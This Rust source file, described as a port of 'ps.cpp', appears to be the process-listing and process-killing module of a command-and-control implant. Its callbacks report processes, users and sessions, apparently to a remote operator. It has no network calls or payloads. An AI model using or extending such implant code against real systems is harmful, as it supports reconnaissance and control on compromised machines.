//! List and kill processes (ps.cpp).

use crate::bformat::FormatP;
use crate::callback::{post_error_dd, Callback};
use crate::commands::{CALLBACK_PENDING, CALLBACK_PROCESS_LIST};
use crate::elevate::{is_wow64, is_x64};
use crate::parse::DataP;
use crate::state::MAJOR_VERSION;
use crate::tokens::token_user;
use windows_sys::Win32::Foundation::{CloseHandle, GetLastError, HANDLE, INVALID_HANDLE_VALUE};
use windows_sys::Win32::Security::TOKEN_QUERY;
use windows_sys::Win32::System::Diagnostics::ToolHelp::*;
use windows_sys::Win32::System::RemoteDesktop::ProcessIdToSessionId;
use windows_sys::Win32::System::Threading::*;

fn is_vista_or_later() -> bool {
    MAJOR_VERSION.load(std::sync::atomic::Ordering::SeqCst) >= 6
}

pub fn command_ps_kill(buffer: &[u8], length: usize) {
    let mut parser = DataP::init(&mut buffer.to_vec());
    let pid = parser.data_int();

    unsafe {
        let h = OpenProcess(PROCESS_TERMINATE, 0, pid);
        if !h.is_null() && TerminateProcess(h, 0) != 0 {
            // do nothing, we're good
        } else {
            post_error_dd(0x23, pid as i32, GetLastError() as i32);
        }
        if !h.is_null() {
            CloseHandle(h);
        }
    }
}

/// Get the username for a process.
fn ps_getusername(h_process: HANDLE, buffer: &mut [u8]) -> bool {
    let mut h_token: HANDLE = std::ptr::null_mut();
    unsafe {
        if OpenProcessToken(h_process, TOKEN_QUERY, &mut h_token) == 0 {
            return false;
        }
    }
    let result = token_user(h_token as isize, buffer);
    unsafe { CloseHandle(h_token) };
    result
}

/// Check if a process is x64 or not.
pub fn is_x64_process(process: isize) -> bool {
    if is_x64() || is_wow64(unsafe { GetCurrentProcess() } as isize) {
        return !is_wow64(process);
    }
    false
}

pub fn command_ps_list(buffer: &[u8], length: usize, callback: Callback) {
    let mut parser = DataP::init(&mut buffer.to_vec());
    let reqid = parser.data_int();

    let mut format = FormatP::init(32768);
    if reqid > 0 {
        format.bformat_int(reqid as i32);
    }

    // check what kind of process we are
    let native: &[u8] = if is_wow64(unsafe { GetCurrentProcess() } as isize) {
        b"x64"
    } else if is_x64() {
        b"x64"
    } else {
        b"x86"
    };

    unsafe {
        // take a snapshot of all processes in the system
        let h_snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if h_snap == INVALID_HANDLE_VALUE {
            format.free();
            return;
        }

        let mut pe32: PROCESSENTRY32W = std::mem::zeroed();
        pe32.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as u32;

        if Process32FirstW(h_snap, &mut pe32) == 0 {
            CloseHandle(h_snap);
            format.free();
            return;
        }

        let mut user = [0u8; 2048];
        loop {
            let h_process = OpenProcess(
                if is_vista_or_later() {
                    PROCESS_QUERY_LIMITED_INFORMATION
                } else {
                    PROCESS_QUERY_INFORMATION
                },
                0,
                pe32.th32ProcessID,
            );

            if h_process.is_null() {
                format.bformat_printf(format_args!(
                    "{}\t{}\t{}\n",
                    String::from_utf16_lossy(&pe32.szExeFile[..pe32.szExeFile.iter().position(|&c| c == 0).unwrap_or(pe32.szExeFile.len())]),
                    pe32.th32ParentProcessID,
                    pe32.th32ProcessID
                ));
            } else {
                if !ps_getusername(h_process, &mut user) {
                    user[0] = 0;
                }
                let uname_len = user.iter().position(|&c| c == 0).unwrap_or(2048);

                let mut sessid: u32 = 0;
                if ProcessIdToSessionId(pe32.th32ProcessID, &mut sessid) == 0 {
                    sessid = u32::MAX; // -1
                }

                let arch: &[u8] = if is_wow64(h_process as isize) { b"x86" } else { native };

                format.bformat_printf(format_args!(
                    "{}\t{}\t{}\t{}\t{}\t{}\n",
                    String::from_utf16_lossy(&pe32.szExeFile[..pe32.szExeFile.iter().position(|&c| c == 0).unwrap_or(pe32.szExeFile.len())]),
                    pe32.th32ParentProcessID,
                    pe32.th32ProcessID,
                    String::from_utf8_lossy(arch),
                    String::from_utf8_lossy(&user[..uname_len]),
                    sessid
                ));
            }

            if !h_process.is_null() {
                CloseHandle(h_process);
            }

            if Process32NextW(h_snap, &mut pe32) == 0 {
                break;
            }
        }

        CloseHandle(h_snap);
    }

    if reqid == 0 {
        let data = format.bformat_string().to_vec();
        let len = format.bformat_length();
        callback(&data, len as i32, CALLBACK_PROCESS_LIST);
    } else {
        let data = format.bformat_string().to_vec();
        let len = format.bformat_length();
        callback(&data, len as i32, CALLBACK_PENDING);
    }
    format.free();
}
